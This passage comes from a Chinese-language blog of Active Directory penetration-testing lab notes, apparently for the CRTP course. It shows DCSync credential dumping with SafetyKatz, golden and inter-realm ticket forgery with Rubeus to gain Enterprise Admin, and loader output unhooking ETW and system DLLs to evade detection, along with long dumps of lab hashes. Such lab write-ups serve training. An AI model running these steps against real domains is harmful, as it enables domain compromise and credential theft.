class="number">9</span>GMtYwNfWiDslLakLP/QnePFbThw+FNyPOQ8CBlGyoxfRiTS4dnOoeM4Rtu5Wbwa0WYA06MuQ3ZpYeU3btWJbkrh197xygJAgZVWGDS4lcSQhmoXMVoGGcQ4febXmx/JRSjQiofNMcWtdcomVOzF+C4lYZ43wjZzlcWf7+W7dD1I18NEX3flMRDIHjGHgdppx8OoiCmUz/Mw7Q07eaGpeK5i3g1ke3AXoRkXwXP4tL2WU3gZHjXl3IxN6+j9Zz+m2wNpemWtmrjTGjOwBQ5Nh/<span class="number">7</span>QFmzgVNYeD4uGED7tJhk1OuEo14jSsU5U7md4nobdSjk5dc4VddFvoqgGWTkfnqMijY74VBg1AYeWK1WFSXihOQ6EX/UzWH3ij+<span class="number">5</span>eX/CWTqEa9k9wkSIjTg2yTOBY1ZoEUk5bbeRkk7rxbDRKANuGEcnpVbfFG5R6vv8b2CkBw1/hcQ4FiWf10xRYi9KyEOZNrW9Xh43q0IzVeh0tyNEroj7G9Ro1v2TYvdgc8Kts0QAiO75AKNlBfLjesmnEtoBGtijggEtMIIBKaADAgEAooIBIASCARx9ggEYMIIBFKCCARAwggEMMIIBCKArMCmgAwIBEqEiBCB/F5pYWfKqUoIE0NvCH4z3e5k+<span class="number">3</span>t2XHLVXz5WgMHSiFaEcGxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKIXMBWgAwIBAaEOMAwbCnN0dWRlbnQ1MjKjBwMFAEDgAACkERgPMjAyNTA1MjcxNTMzMTdapREYDzIwMjUwNTI3MTUzMzE3WqYRGA8yMDI1MDUyODAxMzMxN1qnERgPMjAyNTA2MDMxNTMzMTdaqBwbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FMqS8wLaADAgECoSYwJBsGa3JidGd0Gxpkb2xsYXJjb3JwLm1vbmV5Y29ycC5sb2NhbA==</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Ticket successfully imported!</span><br><span class="line"></span><br><span class="line">[*] Printing a command to recreate a ticket containing the information used within this ticket</span><br><span class="line"></span><br><span class="line">C:\ad\tools\Loader.exe Evasive<span class="literal">-Golden</span> /aes256:<span class="number">154</span>CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:student522 /id:<span class="number">20682</span> /pgid:<span class="number">513</span> /domain:dollarcorp.moneycorp.local /sid:S<span class="literal">-1-5-21-719815819-3726368948-3917688648</span> /pwdlastset:<span class="string">&quot;1/16/2025 10:47:53 PM&quot;</span> /minpassage:<span class="number">1</span> /badpwdcount:<span class="number">738</span> /logoncount:<span class="number">15</span> /displayname:<span class="string">&quot;student522&quot;</span> /netbios:dcorp /groups:<span class="number">1123</span>,<span class="number">513</span> /sids:S<span class="literal">-1-5-21-335606122-960912869-3279953914-519</span> /dc:DCORP<span class="literal">-DC</span>.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD</span><br></pre></td></tr></table></figure>

<p>然后直接访问父域dc的服务，后面跨域tgt因为里面用的最初的TGT，所以里自动会带上sid history了</p>
<p><img src="/wpimages/2025/crtp-lab-note/image-67.png" alt="alt text"></p>
<p>flag是 <code>S-1-5-21-335606122-960912869-3279953914-519</code></p>
<hr>
<h2 id="Learning-Objective-19-1"><a href="#Learning-Objective-19-1" class="headerlink" title="Learning Objective - 19 - 1"></a>Learning Objective - 19 - 1</h2><blockquote>
<p>NTLM hash of krbtgt of moneycorp.local</p>
</blockquote>
<blockquote>
<p>moneycorp.local的krbtgt用户的ntlmhash</p>
</blockquote>
<p>然后是用跨域密钥的方式，伪造一个sids指向企业管理员的跨域TGT</p>
<p>可以mimikatz直接导出所有trust key，也可以指定dcsync来dump信任账户的key</p>
<p>这里我用的后者，先找下信任账户名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainObject|?&#123;$_.samaccounttype -match &quot;TRUST_ACCOUNT&quot;&#125;|select name</span><br></pre></td></tr></table></figure>

<p><img src="/wpimages/2025/crtp-lab-note/image-68.png" alt="alt text"></p>
<p>父域是mcorp显然是 <code>mcorp$</code></p>
<p>然后用da权限导出这个账户的ntlmhash</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line">C:\AD\Tools&gt; .\loader <span class="literal">-path</span> .\SafetyKatz.exe <span class="literal">-args</span> <span class="string">&quot;lsadump::evasive-dcsync /user:mcorp\krbtgt /domain:moneycorp.local&quot;</span> <span class="string">&quot;exit&quot;</span></span><br><span class="line"></span><br><span class="line">[+] Successfully unhooked ETW!</span><br><span class="line">[+++] NTDLL.DLL IS UNHOOKED!</span><br><span class="line">[+++] KERNEL32.DLL IS UNHOOKED!</span><br><span class="line">[+++] KERNELBASE.DLL IS UNHOOKED!</span><br><span class="line">[+++] ADVAPI32.DLL IS UNHOOKED!</span><br><span class="line">[+] URL/PATH : .\SafetyKatz.exe Arguments : lsadump::evasive<span class="literal">-dcsync</span> /user:dcorp\mcorp<span class="variable">$</span> /patch <span class="keyword">exit</span></span><br><span class="line"></span><br><span class="line">  .<span class="comment">#####.   mimikatz 2.2.0 (x64) #19041 Nov  5 2024 21:52:02</span></span><br><span class="line"> .<span class="comment">## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span></span><br><span class="line"> <span class="comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span></span><br><span class="line"> <span class="comment">## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span></span><br><span class="line"> <span class="string">&#x27;## v ##&#x27;</span>       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  <span class="string">&#x27;#####&#x27;</span>        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) <span class="comment"># lsadump::evasive-dcsync /user:dcorp\mcorp$ /patch</span></span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;dollarcorp.moneycorp.local&#x27;</span> will be the domain</span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;dcorp-dc.dollarcorp.moneycorp.local&#x27;</span> will be the DC server</span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;dcorp\mcorp$&#x27;</span> will be the user account</span><br><span class="line">[<span class="type">rpc</span>] Service  : ldap</span><br><span class="line">[<span class="type">rpc</span>] AuthnSvc : GSS_NEGOTIATE (<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">Object RDN           : mcorp<span class="variable">$</span></span><br><span class="line"></span><br><span class="line">** SAM ACCOUNT **</span><br><span class="line"></span><br><span class="line">SAM Username         : mcorp<span class="variable">$</span></span><br><span class="line">Account <span class="built_in">Type</span>         : <span class="number">30000002</span> ( TRUST_ACCOUNT )</span><br><span class="line">User Account Control : <span class="number">00000820</span> ( PASSWD_NOTREQD INTERDOMAIN_TRUST_ACCOUNT )</span><br><span class="line">Account expiration   :</span><br><span class="line">Password last change : <span class="number">5</span>/<span class="number">15</span>/<span class="number">2025</span> <span class="number">2</span>:<span class="number">00</span>:<span class="number">51</span> PM</span><br><span class="line">Object Security ID   : S<span class="literal">-1-5-21-719815819-3726368948-3917688648-1103</span></span><br><span class="line">Object Relative ID   : <span class="number">1103</span></span><br><span class="line"></span><br><span class="line">Credentials:</span><br><span class="line">  Hash NTLM: e83dbf0e81faf41fee25704eb60b4f26</span><br><span class="line">    ntlm- <span class="number">0</span>: e83dbf0e81faf41fee25704eb60b4f26</span><br><span class="line">    ntlm- <span class="number">1</span>: e83dbf0e81faf41fee25704eb60b4f26</span><br><span class="line">    ntlm- <span class="number">2</span>: <span class="number">62565330</span>cc0627ff58e71fa81364078e</span><br><span class="line">    ntlm- <span class="number">3</span>: <span class="number">8966</span>f6b5e73bfea32752257753a33627</span><br><span class="line">    ntlm- <span class="number">4</span>: <span class="number">8966</span>f6b5e73bfea32752257753a33627</span><br><span class="line">    ntlm- <span class="number">5</span>: e2eaf9968d8bb9be4dff63eb10e8446f</span><br><span class="line">    ntlm- <span class="number">6</span>: e2eaf9968d8bb9be4dff63eb10e8446f</span><br><span class="line">    ntlm- <span class="number">7</span>: <span class="number">20549973</span>cabdfa08792a17b7f5eb319c</span><br><span class="line">    ntlm- <span class="number">8</span>: f7074f3907e165b02893242a97fe6e2e</span><br><span class="line">    ntlm- <span class="number">9</span>: ef6752cd526c07bc749f694ee4cb7596</span><br><span class="line">    ntlm<span class="literal">-10</span>: ef6752cd526c07bc749f694ee4cb7596</span><br><span class="line">    ntlm<span class="literal">-11</span>: <span class="number">3664339</span>ecfd21da256d8e16fe6e6ceec</span><br><span class="line">    ntlm<span class="literal">-12</span>: <span class="number">975</span>a6072ad1f26b5ca7bd6214acd42e5</span><br><span class="line">    ntlm<span class="literal">-13</span>: <span class="number">975</span>a6072ad1f26b5ca7bd6214acd42e5</span><br><span class="line">    ntlm<span class="literal">-14</span>: <span class="number">2034</span>b61855f67d4eada3defb991940b0</span><br><span class="line">    ntlm<span class="literal">-15</span>: <span class="number">2034</span>b61855f67d4eada3defb991940b0</span><br><span class="line">    ntlm<span class="literal">-16</span>: <span class="number">59</span>b22ea0b63b069463456711ce6649a4</span><br><span class="line">    ntlm<span class="literal">-17</span>: <span class="number">59</span>b22ea0b63b069463456711ce6649a4</span><br><span class="line">    ntlm<span class="literal">-18</span>: <span class="number">97</span>c70358b2f68c8707275d60b04a39d5</span><br><span class="line">    ntlm<span class="literal">-19</span>: <span class="number">97</span>c70358b2f68c8707275d60b04a39d5</span><br><span class="line">    ntlm<span class="literal">-20</span>: <span class="number">4166</span>f5131d707f71bc4d94a20df1182b</span><br><span class="line">    ntlm<span class="literal">-21</span>: <span class="number">2469</span>e03430738ec884ca9d79b90f6753</span><br><span class="line">    ntlm<span class="literal">-22</span>: f13c02cdc42c545eb976669aff273ca4</span><br><span class="line">    ntlm<span class="literal">-23</span>: <span class="number">3199214</span>e479a6d209711d7f653fdfa8d</span><br><span class="line">    lm  - <span class="number">0</span>: <span class="number">171375514</span>b5943c7f638e0a4d50a17bd</span><br><span class="line">    lm  - <span class="number">1</span>: <span class="number">25</span>b5e851a8f2797cf4c82961b7d76c02</span><br><span class="line">    lm  - <span class="number">2</span>: <span class="number">1751</span>b53b22fe2d33ca3ec62c2a2903c8</span><br><span class="line">    lm  - <span class="number">3</span>: c6409632fbdde00f4b375e54353f2f85</span><br><span class="line">    lm  - <span class="number">4</span>: <span class="number">09656635</span>fa310ded25ccff8324c07392</span><br><span class="line">    lm  - <span class="number">5</span>: <span class="number">24</span>cc6bd4a1c1855a2d8536cdcf3c5416</span><br><span class="line">    lm  - <span class="number">6</span>: ca260c53977416213609f419daa578bc</span><br><span class="line">    lm  - <span class="number">7</span>: cdc5f8b59ba44260a455840aea5b13ab</span><br><span class="line">    lm  - <span class="number">8</span>: <span class="number">70</span>e4d32ab5dc4b72d1339607480f17c8</span><br><span class="line">    lm  - <span class="number">9</span>: <span class="number">6</span>bc774c1ed5c02c4344e41e8bc626078</span><br><span class="line">    lm  <span class="literal">-10</span>: ec9a76daba61f53cc6aa5ffc5b1cdaaf</span><br><span class="line">    lm  <span class="literal">-11</span>: <span class="number">0</span>b009bbbf9a628c91bb49f7c38c4e287</span><br><span class="line">    lm  <span class="literal">-12</span>: bbb584dea175acc2b5818c26bd82d8e6</span><br><span class="line">    lm  <span class="literal">-13</span>: <span class="number">7259</span>d7a9b0465ca122134bb31631b0cc</span><br><span class="line">    lm  <span class="literal">-14</span>: da382578f7fa540b6c4185f83b041cb2</span><br><span class="line">    lm  <span class="literal">-15</span>: <span class="number">65</span>c2568e732114aa4abb1959654f1915</span><br><span class="line">    lm  <span class="literal">-16</span>: ec88a1ee55d3464a9139530df4593dcd</span><br><span class="line">    lm  <span class="literal">-17</span>: c87784979230e91e2c9c6f9a87cb3603</span><br><span class="line">    lm  <span class="literal">-18</span>: c9fcbb31ad66f6825c9c92e4fcb3f2e3</span><br><span class="line">    lm  <span class="literal">-19</span>: <span class="number">8141</span>ba911a1dc463c818c407766a1481</span><br><span class="line">    lm  <span class="literal">-20</span>: <span class="number">63</span>e25a13fca13e8c318ac80b249bd13d</span><br><span class="line">    lm  <span class="literal">-21</span>: d8a924b251b6e784d86323269cc4e9e0</span><br><span class="line">    lm  <span class="literal">-22</span>: c614494f73e0daafd53359feca6d313f</span><br><span class="line">    lm  <span class="literal">-23</span>: d0444681c36bf37a9b2ea2271b1e9e71</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:Kerberos<span class="literal">-Newer-Keys</span> *</span><br><span class="line">    Default Salt : DOLLARCORP.MONEYCORP.LOCALkrbtgtmcorp</span><br><span class="line">    Default Iterations : <span class="number">4096</span></span><br><span class="line">    Credentials</span><br><span class="line">      aes256_hmac       (<span class="number">4096</span>) : f4f41f39802be42b7daaf294818919c5e14ff91ce5b2e72ebcb0561284e0ff39</span><br><span class="line">      aes128_hmac       (<span class="number">4096</span>) : a95e784c6d7cc60019a9891f57ce4ab2</span><br><span class="line">      des_cbc_md5       (<span class="number">4096</span>) : bf49322cb3644f08</span><br><span class="line">    OldCredentials</span><br><span class="line">      aes256_hmac       (<span class="number">4096</span>) : f4f41f39802be42b7daaf294818919c5e14ff91ce5b2e72ebcb0561284e0ff39</span><br><span class="line">      aes128_hmac       (<span class="number">4096</span>) : a95e784c6d7cc60019a9891f57ce4ab2</span><br><span class="line">      des_cbc_md5       (<span class="number">4096</span>) : bf49322cb3644f08</span><br><span class="line">    OlderCredentials</span><br><span class="line">      aes256_hmac       (<span class="number">4096</span>) : <span class="number">7</span>d59c79790f71a348528254ac53b189892bb8491af3d909e961863e47906835b</span><br><span class="line">      aes128_hmac       (<span class="number">4096</span>) : <span class="number">1</span>d583fe33144f3b7d51a6a51cebb4348</span><br><span class="line">      des_cbc_md5       (<span class="number">4096</span>) : cd4f2f2c9e512a19</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos *</span><br><span class="line">    Default Salt : DOLLARCORP.MONEYCORP.LOCALkrbtgtmcorp</span><br><span class="line">    Credentials</span><br><span class="line">      des_cbc_md5       : bf49322cb3644f08</span><br><span class="line">    OldCredentials</span><br><span class="line">      des_cbc_md5       : bf49322cb3644f08</span><br><span class="line"></span><br><span class="line">* Packages *</span><br><span class="line">    NTLM<span class="literal">-Strong-NTOWF</span></span><br><span class="line"></span><br><span class="line">* Primary:WDigest *</span><br><span class="line">    <span class="number">01</span>  <span class="number">3</span>e6c105175e748807ef17c9613c51e31</span><br><span class="line">    <span class="number">02</span>  <span class="number">2673</span>ad957b9f6ff3aa0033e87a004b82</span><br><span class="line">    <span class="number">03</span>  c1514a4b35852fd69d4cbb0e85ab879b</span><br><span class="line">    <span class="number">04</span>  <span class="number">3</span>e6c105175e748807ef17c9613c51e31</span><br><span class="line">    <span class="number">05</span>  <span class="number">2673</span>ad957b9f6ff3aa0033e87a004b82</span><br><span class="line">    <span class="number">06</span>  e23ac2080e4a45a80b462a3cd9cb26b0</span><br><span class="line">    <span class="number">07</span>  <span class="number">3</span>e6c105175e748807ef17c9613c51e31</span><br><span class="line">    <span class="number">08</span>  feca967fc3b5277cb82bd69d4679f0fa</span><br><span class="line">    <span class="number">09</span>  feca967fc3b5277cb82bd69d4679f0fa</span><br><span class="line">    <span class="number">10</span>  <span class="number">1</span>bc30b37c22817884904ece72cb227f9</span><br><span class="line">    <span class="number">11</span>  <span class="number">8275</span>bbd35f77356ac633e8e2bd80ea92</span><br><span class="line">    <span class="number">12</span>  feca967fc3b5277cb82bd69d4679f0fa</span><br><span class="line">    <span class="number">13</span>  <span class="number">713</span>b2ac4e959a41aa3905b6689962322</span><br><span class="line">    <span class="number">14</span>  <span class="number">8275</span>bbd35f77356ac633e8e2bd80ea92</span><br><span class="line">    <span class="number">15</span>  f8dabb65bad5997b1120423e7d3fcb69</span><br><span class="line">    <span class="number">16</span>  f8dabb65bad5997b1120423e7d3fcb69</span><br><span class="line">    <span class="number">17</span>  a06443ce64546d7156e3b523eaee20cb</span><br><span class="line">    <span class="number">18</span>  <span class="number">4</span>c667ce762d65b9f7d6325e43c07f2ba</span><br><span class="line">    <span class="number">19</span>  <span class="number">3</span>c70fb1d016bb25646ac8e54e35a2251</span><br><span class="line">    <span class="number">20</span>  <span class="number">1</span>dee3fceb17afe684e5636014dd19357</span><br><span class="line">    <span class="number">21</span>  <span class="number">8831920973</span>e4b95b63befbec28ac791b</span><br><span class="line">    <span class="number">22</span>  <span class="number">8831920973</span>e4b95b63befbec28ac791b</span><br><span class="line">    <span class="number">23</span>  <span class="number">30651</span>ce5c4121ebd6beb19f11d669935</span><br><span class="line">    <span class="number">24</span>  <span class="number">9369</span>f823dec40240cffbb29df3ade791</span><br><span class="line">    <span class="number">25</span>  <span class="number">9369</span>f823dec40240cffbb29df3ade791</span><br><span class="line">    <span class="number">26</span>  <span class="number">73</span>f9c89831e2ddd9d134de1734aa47e7</span><br><span class="line">    <span class="number">27</span>  <span class="number">5</span>b2fd21ffd0a93b595f81daad7c8cf79</span><br><span class="line">    <span class="number">28</span>  ddc1226225e08c484d96c684e834648b</span><br><span class="line">    <span class="number">29</span>  <span class="number">9498</span>e2382345431f5c50bc8b0a00e465</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mimikatz(commandline) <span class="comment"># exit</span></span><br><span class="line">Bye!</span><br></pre></td></tr></table></figure>

<p>这里 <code>e83dbf0e81faf41fee25704eb60b4f26</code> 就是信任密钥</p>
<p>然后伪造跨域tgt</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\ad\tools&gt; .\Loader.exe <span class="literal">-path</span> .\Rubeus.exe <span class="literal">-args</span> evasive<span class="literal">-silver</span> /user:administrator /service:krbtgt/dollarcorp.moneycorp.local /rc4:e83dbf0e81faf41fee25704eb60b4f26 /sid:S<span class="literal">-1-5-21-719815819-3726368948-3917688648</span> /sids:S<span class="literal">-1-5-21-335606122-960912869-3279953914-519</span> /ldap /ptt /nowrap</span><br><span class="line">[+] Successfully unhooked ETW!</span><br><span class="line">[+++] NTDLL.DLL IS UNHOOKED!</span><br><span class="line">[+++] KERNEL32.DLL IS UNHOOKED!</span><br><span class="line">[+++] KERNELBASE.DLL IS UNHOOKED!</span><br><span class="line">[+++] ADVAPI32.DLL IS UNHOOKED!</span><br><span class="line">[+] URL/PATH : .\Rubeus.exe Arguments : evasive<span class="literal">-silver</span> /user:administrator /service:krbtgt/dollarcorp.moneycorp.local /rc4:e83dbf0e81faf41fee25704eb60b4f26 /sid:S<span class="literal">-1-5-21-719815819-3726368948-3917688648</span> /sids:S<span class="literal">-1-5-21-335606122-960912869-3279953914-519</span> /ldap /ptt /nowrap</span><br><span class="line">[*] Action: Build TGS</span><br><span class="line"></span><br><span class="line">[*] Trying to query LDAP <span class="keyword">using</span> LDAPS for user information on domain controller dcorp-dc.dollarcorp.moneycorp.local</span><br><span class="line">[*] Searching path <span class="string">&#x27;DC=dollarcorp,DC=moneycorp,DC=local&#x27;</span> <span class="keyword">for</span> <span class="string">&#x27;(samaccountname=administrator)&#x27;</span></span><br><span class="line">[*] Retrieving <span class="built_in">group</span> and domain policy information over LDAP from domain controller dcorp<span class="literal">-dc</span>.dollarcorp.moneycorp.local</span><br><span class="line">[*] Searching path <span class="string">&#x27;DC=dollarcorp,DC=moneycorp,DC=local&#x27;</span> <span class="keyword">for</span> <span class="string">&#x27;(|(distinguishedname=CN=Group Policy Creator Owners,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Administrators,CN=Builtin,DC=dollarcorp,DC=moneycorp,DC=local)(objectsid=S-1-5-21-719815819-3726368948-3917688648-513)(name=&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;))&#x27;</span></span><br><span class="line">[*] Attempting to <span class="built_in">mount</span>: \\dcorp<span class="literal">-dc</span>.dollarcorp.moneycorp.local\SYSVOL</span><br><span class="line">[<span class="type">X</span>] Error mounting \\dcorp<span class="literal">-dc</span>.dollarcorp.moneycorp.local\SYSVOL error code ERROR_ACCESS_DENIED (<span class="number">5</span>)</span><br><span class="line">[!] Warning: Unable to get domain policy information, skipping PasswordCanChange and PasswordMustChange PAC fields.</span><br><span class="line">[*] Attempting to <span class="built_in">mount</span>: \\us.dollarcorp.moneycorp.local\SYSVOL</span><br><span class="line">[<span class="type">X</span>] Error mounting \\us.dollarcorp.moneycorp.local\SYSVOL error code ERROR_BAD_NET_NAME (<span class="number">67</span>)</span><br><span class="line">[!] Warning: Unable to get domain policy information, skipping PasswordCanChange and PasswordMustChange PAC fields.</span><br><span class="line">[*] Retrieving netbios name information over LDAP from domain controller dcorp<span class="literal">-dc</span>.dollarcorp.moneycorp.local</span><br><span class="line">[*] Searching path <span class="string">&#x27;CN=Configuration,DC=moneycorp,DC=local&#x27;</span> <span class="keyword">for</span> <span class="string">&#x27;(&amp;(netbiosname=*)(dnsroot=dollarcorp.moneycorp.local))&#x27;</span></span><br><span class="line">[*] Retrieving <span class="built_in">group</span> and domain policy information over LDAP from domain controller dcorp<span class="literal">-dc</span>.dollarcorp.moneycorp.local</span><br><span class="line">[*] Searching path <span class="string">&#x27;DC=dollarcorp,DC=moneycorp,DC=local&#x27;</span> <span class="keyword">for</span> <span class="string">&#x27;(|(distinguishedname=CN=Group Policy Creator Owners,CN=Users,DC=us,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Domain Admins,CN=Users,DC=us,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Administrators,CN=Builtin,DC=us,DC=dollarcorp,DC=moneycorp,DC=local)(objectsid=S-1-5-21-1028785420-4100948154-1806204659-513)(name=&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;))&#x27;</span></span><br><span class="line">[*] Attempting to <span class="built_in">mount</span>: \\dcorp<span class="literal">-dc</span>.dollarcorp.moneycorp.local\SYSVOL</span><br><span class="line">[<span class="type">X</span>] Error mounting \\dcorp<span class="literal">-dc</span>.dollarcorp.moneycorp.local\SYSVOL error code ERROR_ACCESS_DENIED (<span class="number">5</span>)</span><br><span class="line">[!] Warning: Unable to get domain policy information, skipping PasswordCanChange and PasswordMustChange PAC fields.</span><br><span class="line">[*] Attempting to <span class="built_in">mount</span>: \\us.dollarcorp.moneycorp.local\SYSVOL</span><br><span class="line">[<span class="type">X</span>] Error mounting \\us.dollarcorp.moneycorp.local\SYSVOL error code ERROR_BAD_NET_NAME (<span class="number">67</span>)</span><br><span class="line">[!] Warning: Unable to get domain policy information, skipping PasswordCanChange and PasswordMustChange PAC fields.</span><br><span class="line">[*] Retrieving netbios name information over LDAP from domain controller dcorp<span class="literal">-dc</span>.dollarcorp.moneycorp.local</span><br><span class="line">[*] Searching path <span class="string">&#x27;CN=Configuration,DC=moneycorp,DC=local&#x27;</span> <span class="keyword">for</span> <span class="string">&#x27;(&amp;(netbiosname=*)(dnsroot=dollarcorp.moneycorp.local))&#x27;</span></span><br><span class="line">[*] Building PAC</span><br><span class="line"></span><br><span class="line">[*] Domain         : DOLLARCORP.MONEYCORP.LOCAL (dcorp)</span><br><span class="line">[*] SID            : S<span class="literal">-1-5-21-719815819-3726368948-3917688648</span></span><br><span class="line">[*] UserId         : <span class="number">500</span></span><br><span class="line">[*] Groups         : <span class="number">544</span>,<span class="number">512</span>,<span class="number">520</span>,<span class="number">513</span></span><br><span class="line">[*] ExtraSIDs      : S<span class="literal">-1-5-21-335606122-960912869-3279953914-519</span></span><br><span class="line">[*] ServiceKey     : E83DBF0E81FAF41FEE25704EB60B4F26</span><br><span class="line">[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5</span><br><span class="line">[*] KDCKey         : E83DBF0E81FAF41FEE25704EB60B4F26</span><br><span class="line">[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5</span><br><span class="line">[*] Service        : krbtgt</span><br><span class="line">[*] Target         : dollarcorp.moneycorp.local</span><br><span class="line"></span><br><span class="line">[*] Generating EncTicketPart</span><br><span class="line">[*] Signing PAC</span><br><span class="line">[*] Encrypting EncTicketPart</span><br><span class="line">[*] Generating Ticket</span><br><span class="line">[*] Generated KERB<span class="literal">-CRED</span></span><br><span class="line">[*] Forged a TGT <span class="keyword">for</span> <span class="string">&#x27;administrator@dollarcorp.moneycorp.local&#x27;</span></span><br><span class="line"></span><br><span class="line">[*] AuthTime       : <span class="number">5</span>/<span class="number">27</span>/<span class="number">2025</span> <span class="number">10</span>:<span class="number">09</span>:<span class="number">15</span> AM</span><br><span class="line">[*] StartTime      : <span class="number">5</span>/<span class="number">27</span>/<span class="number">2025</span> <span class="number">10</span>:<span class="number">09</span>:<span class="number">15</span> AM</span><br><span class="line">[*] EndTime        : <span class="number">5</span>/<span class="number">27</span>/<span class="number">2025</span> <span class="number">8</span>:<span class="number">09</span>:<span class="number">15</span> PM</span><br><span class="line">[*] RenewTill      : <span 